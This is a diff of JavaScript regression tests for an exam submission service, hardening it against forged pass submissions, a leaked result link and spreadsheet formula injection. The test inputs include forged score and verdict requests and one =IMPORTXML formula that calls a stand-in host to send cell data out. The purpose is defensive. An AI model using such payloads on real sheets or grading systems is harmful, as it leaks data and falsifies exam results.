@@ -123,7 +123,11 @@ test('a verified result carries its metadata, and a lost-response retry adds not
 
   const retry = submit(e);
   assert.equal(retry.duplicate, true);
-  assert.equal(retry.waLink, first.waLink);
+  // r35 (review 09 F-17): the examinee's answer never carries the WhatsApp
+  // link (verdict, score, correct answers); the row keeps it for the examiner.
+  assert.equal(first.waLink, undefined);
+  assert.equal(retry.waLink, undefined);
+  assert.match(String(row[18]), /^https:\/\/wa\.me\//, 'the link is in the row');
   assert.equal(results(e).length, 2, 'the retry did not append');
 });
 
@@ -174,19 +178,68 @@ test('a map entry the key cannot verify keeps the whole result unverified', () =
   assert.equal(row[5], '29/30', 'the unverifiable entry cannot be correct');
 });
 
-test('a missing or malformed registration is stored for manual review', () => {
+// r35 (review 09 F-04, KNOWN_ISSUES #43): this test used to pin the hole
+// itself — "the client figure is kept — and flagged": with no map, the row took
+// the request's score and verdict, so an approved examinee who never started
+// could post {score:30, passed:true} and be stored as a pass. A submit is now
+// scored against the stored map or refused, and a refusal writes nothing.
+test('a missing or malformed registration is refused, and nothing is written', () => {
   const missing = env({ exams: [] });
-  assert.equal(submit(missing, { score: 27, total: 30, percent: 90, passed: true }).status, 'ok');
-  assert.equal(results(missing)[1][5], '27/30', 'the client figure is kept — and flagged');
-  assert.equal(results(missing)[1][22], '');
-  assert.match(results(missing)[1][15], /^⚠️ ציון לא אומת/);
+  const noMap = submit(missing, { score: 27, total: 30, percent: 90, passed: true });
+  assert.equal(noMap.status, 'error');
+  assert.equal(noMap.code, 'no_exam_registration');
+  assert.equal(results(missing).length, 1, 'no row');
+  assert.equal(pendingStatuses(missing)[0], 'in_exam', 'the attempt is not closed either');
 
   const malformed = env({ exams: [examRow({ 2: '{bad-json' })] });
-  assert.equal(submit(malformed, { score: 27, total: 30, percent: 90, passed: true }).status, 'ok');
-  assert.equal(results(malformed)[1][22], '');
-  assert.match(results(malformed)[1][15], /^⚠️ ציון לא אומת/);
+  const bad = submit(malformed, { score: 27, total: 30, percent: 90, passed: true });
+  assert.equal(bad.status, 'error');
+  assert.equal(bad.code, 'invalid_registration');
+  assert.equal(results(malformed).length, 1);
   assert.equal(submit(env({ exams: [examRow({ 2: '{bad-json' })] }), { answers: [] }).status, 'error',
     'a registration that exists still makes answers mandatory');
+});
+
+test('r35: the forged pass — approved, never started, {score:30, passed:true}, no answers — is refused', () => {
+  const e = env({ exams: [], pending: [pendingRow('approved')] });
+  for (const forged of [{ answers: [], score: 30, total: 30, percent: 100, passed: true },
+    { answers: undefined, score: 30, passed: 'true' },
+    { answers: answers(30), score: 30, passed: true }]) {
+    const reply = submit(e, forged);
+    assert.equal(reply.status, 'error');
+    assert.equal(reply.code, 'no_exam_registration');
+  }
+  assert.equal(results(e).length, 1, 'no result row, pass or otherwise');
+  assert.equal(pendingStatuses(e)[0], 'approved', 'the row is not flipped to completed');
+});
+
+test('r35: a verdict the request claims never reaches the row — the server score decides', () => {
+  const e = env();
+  submit(e, { answers: answers(20), score: 30, total: 30, percent: 100, passed: true,
+    verified: true, scoreUnverified: false });
+  const row = results(e)[1];
+  assert.equal(row[5], '20/30');
+  assert.equal(row[7], 'נכשל');
+  assert.equal(row[22], 'מאומת');
+});
+
+test('r35: the licence on the row is the registered one, not the one the request names', () => {
+  const e = env({ pending: [pendingRow('in_exam', { 8: 'C' })] });
+  submit(e, { license: 'B' });
+  assert.equal(results(e)[1][4], 'C');
+});
+
+test('r35: text the device typed is stored as text, never as a formula', () => {
+  const e = env();
+  submit(e, { fullName: '=IMPORTXML("https://x.invalid/?"&A1,"//a")', phone: '+972500000000', site: '@x',
+    time: '-1', device: '=1+1', population: 'רגיל' });
+  const row = results(e)[1];
+  assert.equal(row[2], '\'=IMPORTXML("https://x.invalid/?"&A1,"//a")');
+  assert.equal(row[3], '\'+972500000000');
+  assert.equal(row[10], '\'@x');
+  assert.equal(row[8], '\'-1');
+  assert.equal(row[29], '\'=1+1');
+  assert.equal(row[19], 'רגיל', 'ordinary text is untouched');
 });
 
 test('an empty registered map is refused and can never pass', () => {
@@ -228,7 +281,7 @@ test('a genuine previous result is returned as a duplicate, not superseded', () 
   const e = env({ pending: [pendingRow('completed')], results: [resultRow()] });
   const reply = submit(e);
   assert.equal(reply.duplicate, true);
-  assert.equal(reply.waLink, 'synthetic-existing-link');
+  assert.equal(reply.waLink, undefined, 'r35: the examinee is not handed the link (F-17)');
   assert.equal(results(e).length, 2);
   assert.equal(results(e)[1][7], 'נכשל', 'the genuine row is untouched');
 });
